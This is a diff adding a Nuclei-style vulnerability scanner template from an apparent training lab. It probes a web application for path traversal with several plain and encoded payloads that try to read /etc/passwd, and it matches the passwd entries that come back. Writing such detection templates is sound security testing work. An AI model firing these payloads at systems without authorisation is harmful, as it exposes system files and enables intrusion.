@@ -1,0 +1,40 @@
+id: path-traversal
+
+info:
+  name: Path Traversal Vulnerability
+  author: Demon Slayers Training Lab
+  severity: high
+  description: Detects path traversal vulnerabilities that allow reading arbitrary files
+  reference:
+    - https://owasp.org/www-community/attacks/Path_Traversal
+  tags: path-traversal,directory-traversal,lfi,file-inclusion
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/../../etc/passwd"
+      - "{{BaseURL}}/..%2F..%2Fetc%2Fpasswd"
+      - "{{BaseURL}}/..%252F..%252Fetc%252Fpasswd"
+      - "{{BaseURL}}/etc/passwd"
+      - "{{BaseURL}}/%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+      - "{{BaseURL}}/hashiras/../../etc/passwd"
+      - "{{BaseURL}}/demons/../../../etc/passwd"
+
+    matchers:
+      - type: word
+        words:
+          - "root:x:0:0:root"
+          - "daemon:x:1:1:daemon"
+          - "bin:x:2:2:bin"
+          - "www-data:x:33:33"
+          - "/bin/bash"
+          - "/usr/sbin/nologin"
+        condition: or
+        part: body
+
+      - type: status
+        status:
+          - 200
+
+    matchers-condition: and
+
